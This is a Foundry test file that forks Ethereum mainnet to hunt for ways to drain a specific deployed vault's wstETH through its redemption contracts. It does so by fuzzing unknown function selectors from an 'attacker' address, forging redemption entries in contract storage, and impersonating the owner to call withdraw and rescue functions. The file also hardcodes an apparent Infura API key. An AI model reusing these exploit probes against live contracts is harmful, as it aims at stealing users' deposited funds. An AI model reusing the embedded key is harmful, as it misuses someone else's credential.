// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract Redemption1DeepAnalysis is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant OWNER = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_FindAllRedemption1Selectors() public view {
        console.log("=== ALL REDEMPTION_1 FUNCTION SELECTORS ===\n");

        bytes memory code = REDEMPTION_1.code;

        // Find unique selectors
        bytes4[] memory uniqueSelectors = new bytes4[](100);
        uint uniqueCount = 0;

        for (uint i = 0; i + 4 < code.length; i++) {
            if (uint8(code[i]) == 0x63) { // PUSH4
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));

                // Check if unique
                bool isUnique = true;
                for (uint j = 0; j < uniqueCount; j++) {
                    if (uniqueSelectors[j] == sel) {
                        isUnique = false;
                        break;
                    }
                }

                if (isUnique && uniqueCount < 100) {
                    uniqueSelectors[uniqueCount] = sel;
                    uniqueCount++;
                }
            }
        }

        console.log("Unique selectors found:", uniqueCount);
        for (uint i = 0; i < uniqueCount; i++) {
            console.log(i, ":");
            console.logBytes4(uniqueSelectors[i]);
        }
    }

    function test_TryAllPossibleFunctions() public {
        console.log("=== TRYING ALL POSSIBLE REDEMPTION_1 FUNCTIONS ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        deal(IAU, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);

        // Known selectors from earlier analysis:
        // 0x715018a6 = renounceOwnership()
        // 0xc5d664c6 = ?
        // 0xeda72134 = TASSET()
        // 0x578063ed = ?
        // 0xf2fde38b = transferOwnership(address)
        // 0xfd424ea8 = ?
        // 0xcff50c6e = ?
        // 0xe30c3978 = ?
        // 0x8da5cb5b = owner()
        // 0x9307e802 = ?
        // 0xb2118a8d = ?
        // 0x778d364f = ?
        // 0x79ba5097 = acceptOwnership()
        // 0x411557d1 = ?
        // 0x51cbf345 = ?
        // 0x5c975abb = paused()
        // 0x61d027b3 = ?
        // 0x42dbe168 = ?
        // 0x458f5815 = ?
        // 0x252c50f3 = ?
        // 0x2ab60045 = ?
        // 0x38a63183 = ?
        // 0x04824e70 = ?
        // 0x06e29712 = ?
        // 0x1650cf97 = ?
        // 0x36600461 = ?

        // Try functions that might accept an address parameter
        bytes4[] memory toTry = new bytes4[](20);
        toTry[0] = 0xc5d664c6;
        toTry[1] = 0x578063ed;
        toTry[2] = 0xfd424ea8;
        toTry[3] = 0xcff50c6e;
        toTry[4] = 0xe30c3978;
        toTry[5] = 0x9307e802;
        toTry[6] = 0xb2118a8d;
        toTry[7] = 0x778d364f;
        toTry[8] = 0x411557d1;
        toTry[9] = 0x51cbf345;
        toTry[10] = 0x61d027b3;
        toTry[11] = 0x42dbe168;
        toTry[12] = 0x458f5815;
        toTry[13] = 0x252c50f3;
        toTry[14] = 0x2ab60045;
        toTry[15] = 0x38a63183;
        toTry[16] = 0x04824e70;
        toTry[17] = 0x06e29712;
        toTry[18] = 0x1650cf97;
        toTry[19] = 0x36600461;

        console.log("\nTrying unknown selectors with address param:");
        for (uint i = 0; i < toTry.length; i++) {
            (bool success, bytes memory data) = REDEMPTION_1.call(
                abi.encodeWithSelector(toTry[i], attacker)
            );
            if (success) {
                console.log("SUCCESS with selector:");
                console.logBytes4(toTry[i]);
                if (data.length > 0) {
                    console.log("  Return data length:", data.length);
                }
            }
        }

        // Try with uint256 param
        console.log("\nTrying with uint256 param:");
        for (uint i = 0; i < toTry.length; i++) {
            (bool success,) = REDEMPTION_1.call(
                abi.encodeWithSelector(toTry[i], uint256(100e18))
            );
            if (success) {
                console.log("SUCCESS with selector:");
                console.logBytes4(toTry[i]);
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** VAULT DRAINED! ***");
        }
    }

    function test_FindRedemptionTriggerInRedemption0() public {
        console.log("=== FINDING REDEMPTION TRIGGER IN REDEMPTION_0 ===\n");

        // We know REDEMPTION_0 calls RC.redeem in some execution path
        // Let's find which function triggers this

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        deal(IAU, attacker, 100000e18);

        // First, we need a valid redemption request
        // Let's check if we can use vm.store to create one

        // Create a fake redemption request in storage
        // mapping(address => RedemptionRequest[]) at some slot

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        // Try to redeem
        console.log("\nTrying to create redemption request...");
        (bool success1, bytes memory data1) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(100e18))
        );
        console.log("redeem(100e18) success:", success1);
        if (!success1 && data1.length >= 4) {
            console.log("  Error:");
            console.logBytes4(bytes4(data1));
        }

        vm.stopPrank();

        // What if we bypass the redeem restriction by manipulating storage?
        // Then call finalizeRedeem as attacker

        console.log("\nUsing vm.store to create fake redemption...");

        // Storage layout investigation
        // mapping(address => RedemptionRequest[]) might be at slot X
        // RedemptionRequest might have: amount, to, startTime

        // Try creating entry at different potential slots
        for (uint baseSlot = 5; baseSlot < 15; baseSlot++) {
            bytes32 arrayLenSlot = keccak256(abi.encode(attacker, baseSlot));

            // Set array length to 1
            vm.store(REDEMPTION_0, arrayLenSlot, bytes32(uint256(1)));

            // Set array element data
            bytes32 dataSlot = keccak256(abi.encode(arrayLenSlot));

            // Try different struct layouts
            // Layout 1: amount (uint96) packed with other data
            vm.store(REDEMPTION_0, dataSlot, bytes32(uint256(1000e18)));

            // Layout 2: might include address
            bytes32 dataSlot2 = bytes32(uint256(dataSlot) + 1);
            vm.store(REDEMPTION_0, dataSlot2, bytes32(uint256(uint160(attacker))));

            // Now try finalizeRedeem
            vm.startPrank(attacker);
            vm.warp(block.timestamp + 8 days);

            (bool success,) = REDEMPTION_0.call(
                abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
            );

            vm.stopPrank();

            if (success) {
                console.log("SUCCESS at baseSlot:", baseSlot);
                break;
            }
        }

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** EXPLOIT WORKED VIA STORAGE MANIPULATION! ***");
            console.log("Drained:", (vaultBefore - vaultAfter) / 1e18, "wstETH");
        }
    }

    function test_TryAsOwner() public {
        console.log("=== TRYING AS OWNER ===\n");

        // What if we prank as the owner?
        // The owner might have special functions

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        vm.startPrank(OWNER);

        // Try functions that might only work for owner
        console.log("Trying owner-only functions on REDEMPTION_0:");

        (bool s1,) = REDEMPTION_0.call(
            abi.encodeWithSignature("setRecipient(address)", attacker)
        );
        console.log("setRecipient:", s1);

        (bool s2,) = REDEMPTION_0.call(
            abi.encodeWithSignature("withdraw(address,uint256)", attacker, 1000e18)
        );
        console.log("withdraw:", s2);

        (bool s3,) = REDEMPTION_0.call(
            abi.encodeWithSignature("emergencyWithdraw(address)", attacker)
        );
        console.log("emergencyWithdraw:", s3);

        (bool s4,) = REDEMPTION_0.call(
            abi.encodeWithSignature("rescue(address,address,uint256)", wstETH, attacker, 1000e18)
        );
        console.log("rescue:", s4);

        // Try on REDEMPTION_1 too
        console.log("\nTrying owner-only functions on REDEMPTION_1:");

        (bool r1,) = REDEMPTION_1.call(
            abi.encodeWithSignature("setRecipient(address)", attacker)
        );
        console.log("setRecipient:", r1);

        (bool r2,) = REDEMPTION_1.call(
            abi.encodeWithSignature("withdraw(address,uint256)", attacker, 1000e18)
        );
        console.log("withdraw:", r2);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** OWNER CAN DRAIN! ***");
        }
    }

    function test_CheckDelegatecallToSlot4() public {
        console.log("=== CHECKING DELEGATECALL TO SLOT 4 ADDRESS ===\n");

        // REDEMPTION_1 slot 4 = Gnosis Safe
        // If REDEMPTION_1 delegatecalls to Gnosis Safe for some function,
        // and Gnosis Safe has execTransaction...

        // Let's see what functions in REDEMPTION_1 trigger delegatecall
        bytes memory code = REDEMPTION_1.code;

        // Find DELEGATECALL opcodes and what comes before
        console.log("DELEGATECALL locations in REDEMPTION_1:");
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) {
                console.log("\n  At offset:", i);

                // Check if preceded by SLOAD (loading from storage)
                for (uint j = i > 30 ? i - 30 : 0; j < i; j++) {
                    if (uint8(code[j]) == 0x54) {
                        console.log("    SLOAD at:", j);
                    }
                }
            }
        }
    }
}
